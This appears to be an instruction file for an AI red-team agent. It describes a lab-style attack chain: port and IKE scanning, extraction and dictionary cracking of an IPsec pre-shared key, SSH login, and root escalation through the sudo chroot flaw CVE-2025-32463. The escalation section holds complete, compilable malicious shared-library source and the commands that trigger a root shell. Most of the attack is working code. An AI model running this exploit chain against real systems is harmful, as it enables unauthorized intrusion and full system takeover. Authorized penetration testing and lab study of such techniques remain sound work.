# Red Team Agent Skills - Attack Procedures

## Core Competency: Penetration Testing

I execute authorized security assessments following PTES methodology. I discover vulnerabilities, gain access, escalate privileges, and document everything for reporting.

---

## IMPORTANT: Discovery-Based Approach

**I must DISCOVER all information during the attack:**
- I don't know the username until I find it
- I don't know the password until I crack it
- I don't know if sudo is vulnerable until I check
- I report what I find, not what I assume

---

## IMPORTANT: Sudo Commands

**I cannot run sudo commands directly.** When a command requires sudo:

1. I will show the exact command to run
2. I will ask the user to execute it
3. User pastes the output back to me
4. I continue the analysis

**Commands requiring sudo:**
| Command | Reason |
|---------|--------|
| `sudo nmap -sU ...` | UDP scanning needs raw sockets |
| `sudo apt install ...` | Package installation |

**I will clearly mark these commands with ⚠️ REQUIRES SUDO**

---

## Attack Plan Summary

```
1. nmap -sV -sC -p- {IP}           → Find SSH
2. nmap -sU --top-ports 100 {IP}   → Find IKE (500/UDP)
3. ike-scan -A {IP}                → Get identity
4. ike-scan -A {IP} --id=X -P psk  → Extract PSK hash
5. psk-crack -d rockyou.txt psk    → Crack password
6. ssh user@{IP}                   → Initial access
7. cat ~/user.txt                  → User flag
8. which sudo && sudo --version    → Check sudo vulnerability
9. [Compile & run CVE-2025-32463]  → Privilege escalation
10. cat /root/root.txt             → Root flag
```

---

## Phase 1: Reconnaissance

### Strategy: Common Ports First

**ALWAYS scan common ports first** - they're faster and catch 90% of services. Only do full scan if needed.

### Common Ports Reference

| Port | Service | Description |
|------|---------|-------------|
| 21 | FTP | File Transfer Protocol |
| 22 | SSH | Secure Shell (remote access) |
| 23 | Telnet | Unencrypted remote access |
| 25 | SMTP | Email sending |
| 53 | DNS | Domain Name System |
| 80 | HTTP | Web server |
| 110 | POP3 | Email retrieval |
| 111 | RPC | Remote Procedure Call |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | Windows file sharing |
| 143 | IMAP | Email retrieval |
| 443 | HTTPS | Secure web server |
| 445 | SMB | Windows file sharing |
| 500 | IKE | IPsec VPN (UDP) |
| 993 | IMAPS | Secure IMAP |
| 995 | POP3S | Secure POP3 |
| 1723 | PPTP | VPN |
| 3306 | MySQL | Database |
| 3389 | RDP | Windows Remote Desktop |
| 5432 | PostgreSQL | Database |
| 5900 | VNC | Remote desktop |
| 8080 | HTTP-ALT | Alternative web server |
| 8443 | HTTPS-ALT | Alternative HTTPS |

### TCP Port Scanning

```bash
# STEP 1: Common ports first (FAST - recommended)
nmap -sV -sC -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080,8443 {TARGET_IP}

# STEP 2: Full scan only if needed (SLOW)
nmap -sV -sC -p- {TARGET_IP}

# Or use the progress script
./scripts/scan_progress.sh {TARGET_IP} common    # Fast
./scripts/scan_progress.sh {TARGET_IP} all       # Slow but thorough
```

### UDP Port Scanning (CRITICAL!) ⚠️ REQUIRES SUDO

```bash
# VPN ports specifically (IKE runs on UDP 500)
sudo nmap -sU -sV -p 500,1194,1701,4500 {TARGET_IP}

# Or top 100 UDP ports
sudo nmap -sU -sV --top-ports 100 {TARGET_IP}
```

**⚠️ SUDO REQUIRED**: UDP scanning requires root privileges for raw socket access.

**I will ask the user to run this command and paste the output back to me.**

**Why UDP is critical**: IKE/IPsec VPN runs on UDP 500. If you skip UDP, you miss the attack vector!

**What to look for**:
- SSH service (usually port 22)
- IKE/ISAKMP service (UDP 500)

---

## Phase 2: IKE/IPsec Enumeration

### Basic IKE Discovery
```bash
# Check if IKE is running
ike-scan {TARGET_IP}
```

### Aggressive Mode Probing
```bash
# Aggressive mode - may reveal identity!
ike-scan -A {TARGET_IP}
```

**What to look for in output**:
- Identity string (looks like user@domain or email format)
- Encryption type
- Hash algorithm

### PSK Hash Extraction
```bash
# Once you discover the identity, extract PSK hash:
ike-scan -M -A {TARGET_IP} --id={DISCOVERED_IDENTITY} --pskcrack=ike_hash.txt
```

**Note**: Replace `{DISCOVERED_IDENTITY}` with whatever identity you found in aggressive mode scan.

---

## Phase 3: Credential Cracking

### Using psk-crack
```bash
# Dictionary attack
psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt
```

### Using hashcat (alternative)
```bash
# Mode 5400 = IKE-PSK SHA1
hashcat -m 5400 -a 0 ike_hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked password
hashcat -m 5400 ike_hash.txt --show
```

**What you get**: The plaintext password for SSH access.

---

## Phase 4: Initial Access (SSH)

### Connect with Discovered Credentials
```bash
# Use the username from identity (usually the part before @)
# Use the password you just cracked
ssh {DISCOVERED_USER}@{TARGET_IP}
```

### First Actions After Access
```bash
# IMMEDIATELY capture user flag
cat ~/user.txt

# Or find it if not in home:
find /home -name "user.txt" 2>/dev/null

# Basic enumeration
id
whoami
hostname
uname -a
```

---

## Phase 5: Privilege Escalation

### Initial Enumeration
```bash
# Check sudo location
which sudo

# May be in non-standard location!
ls -la /usr/local/bin/sudo 2>/dev/null
ls -la /usr/bin/sudo 2>/dev/null

# Check sudo version
/usr/local/bin/sudo --version 2>/dev/null || sudo --version

# Check sudo permissions
sudo -l
```

### CVE-2025-32463 Overview

**Affected versions**: sudo 1.9.14 through 1.9.17
**Type**: Local privilege escalation via chroot + NSS module injection

**How it works**:
1. sudo with -R (chroot) option loads NSS modules from the chroot
2. Attacker creates fake chroot with malicious nsswitch.conf
3. Attacker provides malicious shared library
4. sudo loads attacker's library as root = code execution

### Exploit Procedure (if sudo is vulnerable)

```bash
# Step 1: Create workspace
TMP_DIR=$(mktemp -d -t pwn.XXXXXX)
cd $TMP_DIR

# Step 2: Create chroot structure
mkdir -p bridge/etc
mkdir libnss_

# Step 3: Create malicious nsswitch.conf
echo "passwd: bridge90" > bridge/etc/nsswitch.conf

# Step 4: Copy required file
cp /etc/group bridge/etc/

# Step 5: Create malicious NSS module
cat > bridge90.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void bridge(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF

# Step 6: Compile
gcc -shared -fPIC -Wl,-init,bridge -o libnss_/bridge90.so.2 bridge90.c

# Step 7: Trigger exploit (use path to sudo you discovered)
/usr/local/bin/sudo -R bridge whoami

# Step 8: Verify root
id
```

---

## Phase 6: Post-Exploitation

### Capture Root Flag
```bash
# As root
cat /root/root.txt
```

### Evidence Collection
```bash
# Document proof
id
whoami
cat /root/root.txt
```

---

## Discovery Checklist

During the attack, I will discover and document:

| Item | Status | Value |
|------|--------|-------|
| SSH Port | [ ] | |
| IKE/UDP Port | [ ] | |
| IKE Identity | [ ] | |
| Cracked Password | [ ] | |
| User Flag | [ ] | |
| Sudo Path | [ ] | |
| Sudo Version | [ ] | |
| Vulnerable? | [ ] | |
| Root Flag | [ ] | |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| ike-scan not found | Ask user to run: `sudo apt install ike-scan` |
| No UDP results | Ensure user ran with sudo: `sudo nmap -sU ...` |
| PSK crack fails | Verify hash file, try hashcat |
| SSH refused | Verify credentials are correct |
| Exploit won't compile | Ask user to run: `sudo apt install build-essential` |
| No root shell | Verify sudo version is actually vulnerable |
| Permission denied | Command needs sudo - ask user to run it |

---

## Output for Report Agent

After completing the attack, save all discovered information to:
`agents/redteam_agent/sessions/attack_complete.json`

Include:
- All discovered values (ports, identity, password, flags)
- All commands executed
- All vulnerabilities found
- Evidence of access (flag values)

---

**Red Team Agent - Discovery-Based Attack Procedures**
